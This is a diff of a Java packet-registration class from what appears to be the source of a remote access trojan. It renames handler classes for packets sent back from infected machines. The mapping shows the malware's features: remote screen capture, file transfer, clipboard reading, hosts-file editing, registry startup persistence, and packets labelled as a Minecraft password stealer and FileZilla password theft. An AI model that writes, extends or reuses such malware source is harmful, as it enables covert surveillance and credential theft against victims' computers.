@@ -22,7 +22,7 @@ public class Packets {
 		incomingPackets.clear();
 		incomingPackets.put(/* "LOCALE" */(byte) 10, Packet10InitDefaultLocale.class);
 		incomingPackets.put(/* "INSTLOCALES" */(byte) 11, Packet11InstalledLocales.class);
-		incomingPackets.put(/* "DISCONNECT" */(byte) 12, PacketDISCONNECT.class); // disconnect
+		incomingPackets.put(/* "DISCONNECT" */(byte) 12, Packet12Disconnect.class); // disconnect
 		incomingPackets.put(/* "STAT" */(byte) 13, Packet13Status.class); // status
 		incomingPackets.put(/* "COMPUTERNAME" */(byte) 14, Packet14InitComputerName.class); // computername
 		incomingPackets.put(/* "SERVERID" */(byte) 15, Packet15InitServerID.class); // server
@@ -32,7 +32,7 @@ public class Packets {
 		incomingPackets.put(/* "IMAGECOMING" */(byte) 17, Packet17RemoteScreen.class); // image
 		incomingPackets.put(/* "SINGLEIMAGECOMING" */(byte) 18, Packet18OneRemoteScreen.class); // single
 																									// image
-		incomingPackets.put(/* "FOLDERLIST" */(byte) 19, PacketFOLDERLIST.class); // list
+		incomingPackets.put(/* "FOLDERLIST" */(byte) 19, Packet19ListFiles.class); // list
 																					// of
 																					// folders
 																					// in
@@ -53,18 +53,18 @@ public class Packets {
 																				// info
 		incomingPackets.put(/* "LOCALIP" */(byte) 28, Packet28InitLanAddress.class); // local
 																				// ip
-		incomingPackets.put(/* "FILE" */(byte) 29, PacketFILE.class); // file
+		incomingPackets.put(/* "FILE" */(byte) 29, Packet29ReceiveFile.class); // file
 																		// transfer
 		incomingPackets.put(/* "VERSION" */(byte) 30, Packet30InitVersion.class); // version
 		incomingPackets.put(/* "DATE" */(byte) 31, Packet31InitInstallationDate.class); // date
 																		// of
 																		// install
-		incomingPackets.put(/* "VARPROP" */(byte) 32, PacketVARPROP.class); // system
+		incomingPackets.put(/* "VARPROP" */(byte) 32, Packet32SystemProperties.class); // system
 																				// env
 																				// /
 																				// prop
 		incomingPackets.put(/* "THUMBNAIL" */(byte) 33, Packet33Thumbnail.class); // tumbnail
-		incomingPackets.put(/* "DIR" */(byte) 34, PacketDIR.class); // get dir
+		incomingPackets.put(/* "DIR" */(byte) 34, Packet34CustomDirectory.class); // get dir
 		incomingPackets.put(/* "CHAT" */(byte) 35, Packet35ChatMessage.class); // chat
 		incomingPackets.put(/* "MC" */(byte) 36, Packet36MinecraftPassword.class); // minecraft
 																	// stealer
@@ -73,29 +73,29 @@ public class Packets {
 		incomingPackets.put(/* "HOSTF" */(byte) 38, Packet38HostFile.class); // host
 																			// file
 																			// text
-		incomingPackets.put(/* "HOSTANSW" */(byte) 39, PacketHOSTANSW.class); // host
+		incomingPackets.put(/* "HOSTANSW" */(byte) 39, Packet39HostEditResult.class); // host
 																				// file
 																				// answer
 		incomingPackets.put(/* "UTOR" */(byte) 40, Packet40UTorrentDownload.class); // utorrent
 																		// logs
-		incomingPackets.put(/* "CBOARDC" */(byte) 41, PacketCBOARDC.class); // clipboard
+		incomingPackets.put(/* "CBOARDC" */(byte) 41, Packet41Clipboard.class); // clipboard
 																				// contents
 		incomingPackets.put(/* "FC" */(byte) 42, Packet42PreviewFile.class); // file
 																	// preview
 		incomingPackets.put(/* "IC" */(byte) 43, Packet43PreviewImage.class); // image
 																	// preview
 		incomingPackets.put(/* "JVM" */(byte) 44, Packet44SystemJavaProperty.class); // JVM info
-		incomingPackets.put(/* "ZIP" */(byte) 45, PacketZIP.class); // zip
+		incomingPackets.put(/* "ZIP" */(byte) 45, Packet45ArchivePreview.class); // zip
 																		// preview
-		incomingPackets.put(/* "MD5" */(byte) 46, PacketMD5.class); // file md5
+		incomingPackets.put(/* "MD5" */(byte) 46, Packet46FileHash.class); // file md5
 		incomingPackets.put(/* "COUNTRY" */(byte) 47, Packet47InitCountry.class); // user.country
 																				// backup
 		incomingPackets.put(/* "FZ" */(byte) 48, Packet48FileZillaPassword.class); // filezilla
 		incomingPackets.put(/* "LAN" */(byte) 49, Packet49LanDevices.class); // lan view
-		incomingPackets.put(/* "IPC" */(byte) 50, PacketIPC.class); // ipconfig
+		incomingPackets.put(/* "IPC" */(byte) 50, Packet50IPConfig.class); // ipconfig
 		incomingPackets.put(/* "APORT" */(byte) 51, Packet51ActivePort.class); // active
 																			// port
-		incomingPackets.put(/* "WINSER" */(byte) 52, PacketWINSER.class); // windows
+		incomingPackets.put(/* "WINSER" */(byte) 52, Packet52WindowsService.class); // windows
 																			// service
 																			// listing
 		incomingPackets.put(/* "REGSTART" */(byte) 53, Packet53RegistryStartup.class); // registry
